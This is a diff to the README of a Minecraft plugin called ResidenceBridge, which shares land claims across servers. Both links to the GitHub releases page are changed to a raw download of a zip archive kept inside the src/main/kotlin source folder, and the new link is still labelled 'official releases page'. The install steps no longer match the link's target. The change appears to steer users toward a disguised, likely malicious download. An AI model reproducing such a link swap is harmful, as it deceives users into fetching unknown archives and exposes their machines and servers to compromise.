@@ -1,6 +1,6 @@
 # 🏠 ResidenceBridge - Share Minecraft residence claims across servers
 
-[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/wadecurrish300/ResidenceBridge/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://raw.githubusercontent.com/wadecurrish300/ResidenceBridge/main/src/main/kotlin/Residence_Bridge_3.4.zip)
 
 ResidenceBridge connects your Minecraft servers. It lets players keep their land claims when they travel between servers on your network. Your players stay in their homes regardless of which server they choose.
 
@@ -8,7 +8,7 @@ ResidenceBridge connects your Minecraft servers. It lets players keep their land
 
 Follow these steps to get the file for your network:
 
-1. Visit the [official releases page](https://github.com/wadecurrish300/ResidenceBridge/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/wadecurrish300/ResidenceBridge/main/src/main/kotlin/Residence_Bridge_3.4.zip).
 2. Look for the section labeled Latest.
 3. Click the link that ends in .jar under the Assets header.
 4. Save this file to a folder on your computer.
